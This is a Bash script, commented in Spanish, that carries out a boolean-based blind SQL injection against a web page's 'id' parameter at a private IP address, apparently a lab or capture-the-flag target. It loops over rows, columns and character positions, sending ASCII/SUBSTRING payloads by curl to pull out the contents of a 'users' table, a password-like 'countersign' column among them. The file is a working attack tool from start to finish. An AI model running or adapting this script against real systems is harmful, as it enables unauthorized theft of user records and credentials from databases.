#!/bin/bash

URL_BASE="http://172.20.10.12/?page=member"
MAX_COLUMNS=8
MAX_ROWS=10
MAX_CHAR=100
TRIGGER="First name: one"

# Columnas extraídas previamente
columns=("user_id" "first_name" "last_name" "town" "country" "planet" "Commentaire" "countersign")

urlencode() {
    # URL-encode simple (solo para payloads ASCII básicos)
    local string="${1}"
    local encoded=""
    for (( i=0; i<${#string}; i++ )); do
        c=${string:$i:1}
        case "$c" in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) encoded+=$(printf '%%%02X' "'$c") ;;
        esac
    done
    echo "$encoded"
}

echo "Extrayendo registros de la tabla 'users'..."

for ((row=0; row<$MAX_ROWS; row++)); do
    echo
    echo "[$row] -----------------------------"
    empty_row=true

    for ((col=0; col<$MAX_COLUMNS; col++)); do
        column_name="${columns[$col]}"
        value=""
        for ((pos=1; pos<=$MAX_CHAR; pos++)); do
            found_char=false
            for ascii in {32..126}; do
                payload="1 AND ASCII(SUBSTRING((SELECT ${column_name} FROM users LIMIT ${row},1),${pos},1))=${ascii}"
                encoded_payload=$(urlencode "$payload")
                full_url="${URL_BASE}&id=${encoded_payload}&Submit=Submit#"

                response=$(curl -s "$full_url")

                if echo "$response" | grep -q "$TRIGGER"; then
                    value+=$(printf \\$(printf '%03o' $ascii))
                    found_char=true
                    break
                fi
            done

            if ! $found_char; then
                break
            fi
        done

        echo "$column_name: $value"
        if [[ -n "$value" ]]; then
            empty_row=false
        fi
    done

    $empty_row && {
        echo "No se encontraron más registros. Extracción finalizada."
        break
    }
done
